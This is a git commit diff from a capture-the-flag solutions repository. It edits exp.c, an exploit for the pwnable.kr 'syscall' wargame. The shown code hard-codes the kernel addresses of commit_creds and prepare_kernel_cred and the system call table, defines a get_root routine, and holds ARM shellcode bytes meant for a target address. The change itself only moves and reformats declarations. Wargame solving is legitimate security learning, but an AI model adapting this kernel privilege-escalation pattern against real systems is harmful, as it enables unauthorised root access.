f0573882ddc1887c3efe82f96010452375cf473b
Seas0n <306443228@qq.com>
2016-10-18 09:02:46 +0800

    pwnable.kr-rookiss-syscall

--- solutions/wargames/pwnable.kr/syscall/exp.c
+++ solutions/wargames/pwnable.kr/syscall/exp.c
@@ -4,8 +4,10 @@
 #define SYS_CALL_TABLE 0x8000e348
 #define NR_SYS_VULN  223
 
-int (*commit_creds)(void *) = (void *)0x8003f56c;
-void *(*prepare_kernel_cred)(void *) = (void *)0x8003f924;
+char flag[128];
+
+int (*commit_creds)(void *)             = (void *)0x8003f56c;
+void *(*prepare_kernel_cred)(void *)    = (void *)0x8003f924;
 
 
 void get_root() {
@@ -14,14 +16,12 @@ void get_root() {
 
 int main(int argc, const char *argv[])
 {
-    char flag[128];
-    void *target = (void*) 0x82ffbabe;  
-    void *syscall_addr = (void*) 0x8000e6c4;  
-    char target_addr[] = "\xbe\xba\xff\x82";  
-
-    char shellcode[0xa0] = "\xf0\x4f\x2d\xe9\x30\xff"  
-                           "\x2f\xe1\xf0\x4f\xbd\xe8"
-                           "\x1e\xff\x2f\xe1";
+    void *target        = (void*) 0x82ffbabe;
+    void *syscall_addr  = (void*) 0x8000e6c4;
+    char target_addr[]  = "\xbe\xba\xff\x82";
+    char shellcode[]    = "\xf0\x4f\x2d\xe9\x30\xff"  
+                          "\x2f\xe1\xf0\x4f\xbd\xe8"
+                          "\x1e\xff\x2f\xe1";
 
     /*
      * copy shellcode to target addr
